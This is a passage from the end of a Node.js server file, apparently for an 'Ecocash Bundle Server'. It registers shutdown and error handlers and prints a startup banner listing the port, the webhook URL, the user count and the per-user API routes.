process.on('SIGINT',  () => shutdown('SIGINT'));
process.on('uncaughtException',  (e) => logger.error('Uncaught:', e.message, e.stack));
process.on('unhandledRejection', (r) => logger.error('Unhandled rejection:', r));

// ─── START ────────────────────────────────────────────────────────────────
const server = app.listen(PORT, () => {
  console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log(`🛰️  Ecocash Bundle Server`);
  console.log(`🚀  Port: ${PORT}`);
  console.log(`🌐  Webhook base: ${CFG.WEBHOOK_URL || '⚠️  WEBHOOK_URL not set!'}`);
  console.log(`👥  Users: ${users.size}/${CFG.MAX_USERS}`);
  users.forEach((u, l) => console.log(`   ⏳ ${u.name}: /api/${l}/*`));
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
});
